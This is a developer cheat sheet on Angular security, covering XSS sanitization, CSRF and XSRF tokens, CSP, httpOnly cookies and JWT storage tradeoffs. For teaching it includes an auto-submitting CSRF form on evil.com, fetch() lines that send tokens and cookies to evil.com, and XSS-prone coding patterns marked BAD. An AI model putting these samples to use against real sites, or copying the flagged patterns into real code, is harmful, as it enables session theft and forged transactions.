# Angular Security Cheat Sheet — XSS, CSRF, Cookies

## 1. XSS (Cross-Site Scripting)

**What it is:** Attacker-injected script executes in the victim's browser context, stealing data or acting as the user.

**Types:** Stored (saved in DB) · Reflected (in URL, echoed back) · DOM-based (client JS writes untrusted data to DOM)

**Angular's default defense — contextual auto-sanitization:**

| Context      | Binding               | Sanitized as                             |
| ------------ | --------------------- | ---------------------------------------- |
| HTML         | `[innerHTML]`         | strips `<script>`, event handlers        |
| Style        | `[style]`             | strips `expression()`, malicious `url()` |
| URL          | `[href]`, `[src]`     | blocks `javascript:` URLs                |
| Resource URL | iframe/script `[src]` | strictest — must be explicitly trusted   |

```typescript
// Safe by default
<div>{{ userInput }}</div>  // always escaped, never executed

// Sanitized automatically
<div [innerHTML]="userHtml"></div>  // dangerous tags/attrs stripped

// DANGEROUS - skips sanitization entirely
this.sanitizer.bypassSecurityTrustHtml(userInput); // only if input is verified safe, never on raw user input
```

**Common holes despite Angular's protection:**

```typescript
// Direct DOM write - Angular's sanitizer never sees this
this.el.nativeElement.innerHTML = userInput; // BAD

// bypassSecurityTrust* on attacker-controlled data
url = this.sanitizer.bypassSecurityTrustUrl(queryParam); // BAD if queryParam is user input
```

**Fix pattern (e.g. chat/CMS content):**

```typescript
constructor(private sanitizer: DomSanitizer) {}
safeMessage(raw: string): string {
  return this.sanitizer.sanitize(SecurityContext.HTML, raw) ?? '';
}
```

Or pre-clean with DOMPurify for finer allow-listing:

```typescript
import DOMPurify from "dompurify";
clean = DOMPurify.sanitize(userInput, { ALLOWED_TAGS: ["b", "i", "a"] });
```

**Sanitization vs Escaping:**

```
Escaping:      '<script>' → '&lt;script&gt;'   (encoded, displayed as text)
Sanitization:  '<script>x</script><b>ok</b>' → '<b>ok</b>'  (removed, not just encoded)
```

---

## 2. CSRF (Cross-Site Request Forgery)

**What it is:** Attacker's site tricks the victim's browser into firing a request to your backend, relying on the browser auto-attaching the victim's session cookie.

```html
<!-- Hosted on evil.com -->
<form action="https://yourapp.com/api/transfer" method="POST">
  <input name="amount" value="1000" /><input name="to" value="attacker" />
</form>
<script>
  document.forms[0].submit();
</script>
```

**Angular's XSRF token pattern (synchronizer token):**

```typescript
// app.config.ts
provideHttpClient(
  withXsrfConfiguration({
    cookieName: "XSRF-TOKEN",
    headerName: "X-XSRF-TOKEN",
  }),
);
```

```
1. Backend sets:  Set-Cookie: XSRF-TOKEN=abc123   (NOT httpOnly — must be JS-readable)
2. Angular reads: document.cookie → 'abc123'
3. Angular sends: X-XSRF-TOKEN: abc123            (attached to every HttpClient request)
4. Backend checks: cookie value === header value  → proves request came from your own JS
```

Attacker's page can trigger the request but **can't read your cookie** (Same-Origin Policy) to forge the matching header → request fails validation.

**SameSite as a second layer:**

```
SameSite=Strict → cookie never sent on cross-site requests (breaks legit cross-site nav, e.g. email links)
SameSite=Lax    → sent on top-level GET nav, blocked on cross-site POST/fetch (practical default)
SameSite=None   → sent everywhere; MUST pair with Secure or browser rejects the cookie
```

**Note:** JWT in `Authorization` header (not cookie) sidesteps CSRF entirely — no auto-attachment — but reintroduces XSS token-theft risk if stored in `localStorage`.

---

## 3. CSP (Content Security Policy) — defense-in-depth for XSS

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'strict-dynamic' 'nonce-r4nd0m123';
  style-src 'self' 'nonce-r4nd0m123';
  connect-src 'self' https://api.yourapp.com;
  frame-ancestors 'none';
```

**Angular-specific friction:**

- Emulated view encapsulation injects `<style>` tags per component → needs `'unsafe-inline'` unless using a **nonce**
- JIT mode needs `'unsafe-eval'` — **AOT prod builds don't** (remove it from prod CSP)
- `strict-dynamic` + nonce is the modern approach, plays well with lazy-loaded chunks

```typescript
// main.ts - attach nonce so Angular-injected styles/scripts pass CSP
providers: [{ provide: CSP_NONCE, useValue: nonceFromMetaTag }];
```

**Clickjacking (related):**

```
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none';   // or 'self' https://trusted-partner.com
```

---

## 4. httpOnly Cookies — the mechanism, end to end

**What `httpOnly` means:** JS cannot read the cookie via `document.cookie`. The browser still sends it automatically on matching HTTP requests — it's invisible to JS, not disabled.

```typescript
res.cookie("token", jwt, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
  maxAge: 900000,
});
```

**Why it stops XSS token theft:**

```javascript
// Injected script via XSS hole:
fetch(`evil.com?t=${localStorage.getItem("token")}`); // STOLEN if token is in localStorage
fetch(`evil.com?t=${document.cookie}`); // httpOnly cookie NEVER appears here
```

The script can still cause the browser to _use_ the cookie in a request, but can't read and exfiltrate its raw value.

**Every JS-side avenue to read it is blocked at the browser API level:**

```javascript
document.cookie; // omits httpOnly cookies
fetch(url).then((r) => r.headers.get("Set-Cookie")); // always null — Set-Cookie is a forbidden response header
xhr.setRequestHeader("Cookie", x); // throws — Cookie is a forbidden header name for JS to set
```

### How the browser actually attaches it (JS is not involved)

The cookie jar lives in the browser's **network stack**, architecturally separate from the JS engine (V8) — this isolation _is_ the security guarantee.

```
┌────────────── JS Execution (V8) ──────────────┐
│ http.get(url, { withCredentials: true })       │
│      │ (just a request TO the browser)         │
└──────┼──────────────────────────────────────────┘
       ▼  <-- JS control ends here
┌────────────── Browser Network Stack ───────────┐
│ 1. Match cookie jar: domain, path, Secure,      │
│    SameSite, not-expired                        │
│ 2. Build raw HTTP request + Cookie header        │
│ 3. Send over TCP/TLS                             │
└──────────────────────────────────────────────────┘
```

**Sequence:**

```
[Login]
  Backend → Set-Cookie: token=abc123; HttpOnly; Secure; SameSite=Strict
  Browser → stores in internal cookie jar (JS never sees it)

[Later API call]
  Angular  → http.get(url, { withCredentials: true })   // just grants permission
  Browser  → runs matching algorithm → finds token=abc123 →
             attaches "Cookie: token=abc123" header → sends request
  Backend  → reads Cookie header, validates session
```

**`withCredentials` is the _only_ JS-side lever** — and it only controls _permission_ for cross-origin cookie attachment, never the data itself:

```typescript
this.http.get("https://api.yourapp.com/profile", { withCredentials: true });
```

- Same-origin requests: cookies attach automatically, no flag needed.
- Cross-origin requests: flag required, **plus** backend CORS must explicitly allow it:

```typescript
app.use(cors({ origin: "https://app.yourapp.com", credentials: true })); // origin can't be '*' here
```

Forgetting the flag per call-site is a common bug → enforce globally via interceptor:

```typescript
@Injectable()
export class CredentialsInterceptor implements HttpInterceptor {
  intercept(req: HttpRequest<any>, next: HttpHandler) {
    return next.handle(req.clone({ withCredentials: true }));
  }
}
```

---

## 5. JWT Storage Tradeoff (ties it all together)

| Storage           | XSS risk                                               | CSRF risk                                             |
| ----------------- | ------------------------------------------------------ | ----------------------------------------------------- |
| `localStorage`    | **Vulnerable** — any injected script reads it directly | Immune — not auto-attached                            |
| `httpOnly` cookie | Immune — JS can't read the value                       | **Vulnerable** — needs SameSite/XSRF-token mitigation |

**Senior-pattern compromise:**

```typescript
// Short-lived access token in memory (not persisted, gone on refresh - acceptable tradeoff)
class AuthService {
  private accessToken: string | null = null;
  refresh() {
    return this.http
      .post("/auth/refresh", {}, { withCredentials: true })
      .pipe(tap((res) => (this.accessToken = res.accessToken)));
  }
}

// Long-lived refresh token: httpOnly, path-scoped, so it's only ever sent to the refresh endpoint
res.cookie("refresh_token", refreshJwt, {
  httpOnly: true,
  sameSite: "strict",
  path: "/auth/refresh",
  maxAge: 7 * 24 * 60 * 60 * 1000,
});
```

---

## Interview One-Liners

- **XSS:** "Angular sanitizes based on binding context, but that's bypassed by `bypassSecurityTrust*` on untrusted input or direct `nativeElement` writes."
- **CSRF:** "The XSRF cookie is deliberately _not_ httpOnly, so JS can read it and echo it back as a header — proving the request came from your own script, not a forged cross-site one."
- **httpOnly mechanism:** "Cookie attachment happens in the browser's network stack, isolated from the JS engine — that isolation is the entire security guarantee. `withCredentials` only grants permission; JS never touches the value."
- **JWT storage:** "localStorage trades CSRF safety for XSS exposure; httpOnly cookies trade XSS safety for CSRF exposure — mitigated with SameSite + XSRF-token pairing."
- **Route guards:** "Not a security boundary — UX only. Backend must independently enforce authz on every request."
